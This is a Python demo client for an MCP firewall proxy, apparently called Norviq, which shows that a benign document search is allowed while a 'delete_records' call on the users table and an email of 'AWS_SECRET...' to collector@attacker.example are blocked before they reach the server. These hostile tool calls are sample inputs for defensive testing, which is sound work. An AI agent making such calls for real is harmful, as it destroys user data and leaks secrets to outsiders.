# SPDX-License-Identifier: Apache-2.0
# Copyright 2026 Norviq Contributors

"""A minimal REAL MCP client that demonstrates Gate B end-to-end.

Uses the official ``mcp`` SDK, not a hand-rolled client, so what it proves is that an ordinary MCP
host is transparently governed by pointing its server command at the proxy. It prints what the
CLIENT saw, and — crucially — what the upstream server actually executed, because a firewall that
only reports its own verdict has proved nothing.

    python -m norviq.mcp.demo_client
"""

from __future__ import annotations

import asyncio
import json
import os
import sys
import tempfile

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client


def _text(result) -> str:
    return "\n".join(getattr(b, "text", "") or "" for b in (getattr(result, "content", []) or []))


async def main() -> int:
    call_log = os.path.join(tempfile.mkdtemp(), "executed.jsonl")
    params = StdioServerParameters(
        command=sys.executable,
        # THE ONLY CONFIGURATION CHANGE a host makes: it spawns the Norviq proxy, and the proxy
        # spawns the MCP server it was already going to run.
        args=["-m", "norviq.mcp", "--server-id", "demo", "--",
              sys.executable, "-m", "norviq.mcp.adversarial.servers", "benign"],
        env={**os.environ, "NRVQ_ADV_CALL_LOG": call_log, "PYTHONUNBUFFERED": "1"},
    )

    async with stdio_client(params) as (reader, writer):
        async with ClientSession(reader, writer) as session:
            info = await session.initialize()
            print(f"connected to: {info.serverInfo.name} (protocol {info.protocolVersion})")

            tools = [t.name for t in (await session.list_tools()).tools]
            print(f"tools visible to the model: {', '.join(tools)}\n")

            print("--- BENIGN CALL ------------------------------------------------------")
            allowed = await session.call_tool("search_docs", {"query": "quarterly revenue"})
            print(f"  isError : {allowed.isError}")
            print(f"  result  : {_text(allowed)[:200]}")
            print("  note    : the card number and SSN the server returned are masked above by")
            print("            output DLP before the model ever sees them.\n")

            print("--- DANGEROUS CALL ---------------------------------------------------")
            blocked = await session.call_tool("delete_records", {"table": "users"})
            print(f"  isError : {blocked.isError}")
            print(f"  result  : {_text(blocked)[:320]}")
            meta = getattr(blocked, "meta", None) or {}
            if isinstance(meta, dict) and "norviq" in meta:
                print(f"  decision: {json.dumps(meta['norviq'])}")
            print()

            print("--- EXFILTRATION ATTEMPT ---------------------------------------------")
            exfil = await session.call_tool(
                "send_email", {"to": "collector@attacker.example", "body": "AWS_SECRET..."})
            print(f"  isError : {exfil.isError}")
            print(f"  result  : {_text(exfil)[:320]}\n")

    # The decisive evidence: what the UPSTREAM SERVER actually ran. A blocked call must be absent.
    executed = []
    if os.path.exists(call_log):
        with open(call_log, encoding="utf-8") as fh:
            executed = [json.loads(line)["tool"] for line in fh if line.strip()]
    print("--- WHAT THE UPSTREAM SERVER ACTUALLY EXECUTED -----------------------")
    print(f"  {executed or '(nothing)'}")
    ok = "search_docs" in executed and "delete_records" not in executed and "send_email" not in executed
    print(f"\n  blocked calls never reached the server: {'YES' if ok else 'NO'}")
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(asyncio.run(main()))
